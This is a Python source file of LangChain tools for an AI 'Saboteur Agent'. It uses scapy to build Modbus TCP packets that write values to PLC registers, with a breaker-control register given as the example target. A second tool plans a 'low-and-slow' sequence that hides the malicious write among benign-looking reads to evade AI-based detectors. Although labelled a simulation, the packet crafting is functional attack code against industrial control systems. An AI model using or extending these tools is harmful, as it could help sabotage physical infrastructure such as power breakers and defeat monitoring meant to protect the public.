import time
from langchain_core.tools import tool
from scapy.all import send
from scapy.layers.inet import TCP, IP
from scapy.contrib.modbus import ModbusADURequest, ModbusPDU10WriteMultipleRegistersRequest

# --- OT_Forge Toolkit for the Saboteur Agent ---
# This toolkit contains the specialized functions for crafting and disguising
# attacks against Operational Technology (OT) systems like PLCs.

@tool
def craft_modbus_exploit_packet(target_ip: str, plc_register: int, value: int) -> str:
    """
    Crafts a raw Modbus TCP packet designed to write a specific value to a PLC register.
    This function simulates the creation of a direct exploit payload. In a real scenario,
    this would be the primary tool for a "loud" or direct attack.
    Args:
        target_ip: The IP address of the target PLC.
        plc_register: The specific register to write to (e.g., a breaker control register).
        value: The value to write (e.g., 0 for OPEN, 1 for CLOSED).

    Returns:
        A string summarizing the crafted Scapy packet, which can be used by other tools.
    """
    print(f"---  SABOTEUR/TOOL (OT_Forge): Crafting Modbus write command for IP {target_ip}...")
    
    # This simulates an exploit by directly commanding the PLC to change its state.
    # We assume register 40001 is the breaker control for this scenario.
    
    # Layer 3: Modbus Protocol Data Unit (PDU) - The core command
    pdu = ModbusPDU10WriteMultipleRegistersRequest(
        startingAddr=plc_register,
        outputsValue=[value] 
    )
    
    # Layer 2: Modbus Application Data Unit (ADU) - Prep for TCP transport
    adu = ModbusADURequest(transId=1, protoId=0, unitId=1, pdu=pdu)
    
    # Layer 1: IP/TCP Packet - The network envelope
    packet = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu
    
    print("--- SABOTEUR/TOOL (OT_Forge): Direct exploit packet crafted successfully. ---")
    
    # We return a summary for the agent's context and a representation of the packet
    # that can be used later. For simplicity, we'll just return the summary for now.
    return packet.summary()

@tool
def create_evasion_attack_sequence(target_ip: str, plc_register: int, value: int) -> str:
    """
    Creates a 'low-and-slow' attack sequence to evade AI-based detectors.
    This function crafts the malicious packet but also crafts several benign-looking
    packets to act as camouflage. The sequence is meant to be executed by the
    Executioner agent.
    
    Args:
        target_ip: The IP address of the target PLC.
        plc_register: The specific register to write to.
        value: The value to write in the malicious packet.

    Returns:
        A structured string or JSON representing the sequence of packets to be sent.
    """
    print(f"--- SABOTEUR/TOOL (OT_Forge): Creating evasion attack sequence for {target_ip}... ---")
    
    # Note: In a real implementation, you might return serialized Scapy packets.
    # For clarity in the agentic loop, we return a clear description of the plan.
    evasion_plan = {
        "description": "A low-and-slow attack sequence with benign traffic padding.",
        "target": target_ip,
        "steps": [
            {"action": "SEND_BENIGN_READ", "register": 100, "delay_after": 2},
            {"action": "SEND_EXPLOIT_WRITE", "register": plc_register, "value": value, "delay_after": 3},
            {"action": "SEND_BENIGN_READ", "register": 200, "delay_after": 0}
        ]
    }
    
    print("--- SABOTEUR/TOOL (OT_Forge): Evasion sequence created. ---")
    return str(evasion_plan)